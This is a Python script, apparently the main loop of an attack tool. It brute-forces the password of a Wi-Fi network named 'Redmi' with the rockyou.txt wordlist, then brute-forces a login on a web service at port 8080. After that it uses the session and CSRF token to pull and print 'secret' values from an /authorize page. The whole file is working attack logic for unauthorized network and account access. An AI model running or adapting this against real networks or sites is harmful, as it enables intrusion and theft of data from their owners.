from bs4 import BeautifulSoup
from brute_force import brute_force_pass_site, brute_force_pass_wifi
from wifi_connect import verify_connected

def get_secret_info(response) -> list[str]:
    soup = BeautifulSoup(response.text, 'html.parser')

    values = soup.find_all("div", attrs={"class": "value"})
    datas = []
    for value in values:
        datas.append(value.text.strip())
    return datas

def main():
    try:
        while True:
            # 1. Brute force password wifi
            ssid, ip = brute_force_pass_wifi("Redmi", "rockyou.txt")
            print(ip)
            if not ssid or not ip:
                print("No wifi found, retrying...")
                continue
            session, csrf_token = None, None
            while verify_connected(ssid):
                print("Start attack...")
                api_url = f"http://{ip}:8080/gate"
                if not session and not csrf_token:
                    # 2. Brute force password site
                    session, csrf_token = brute_force_pass_site(api_url, "rockyou.txt")
                    if session is None:
                        continue
                try:
                    response = session.get(f"http://{ip}:8080/authorize", headers={"csrf-token": csrf_token})
                    datas = get_secret_info(response)
                    print(datas)
                except Exception as e:
                    print("The connection is interrupted, is connecting...")
                    session, csrf_token = None, None
    except KeyboardInterrupt:
        print("Exiting...")


if __name__ == '__main__':
    main()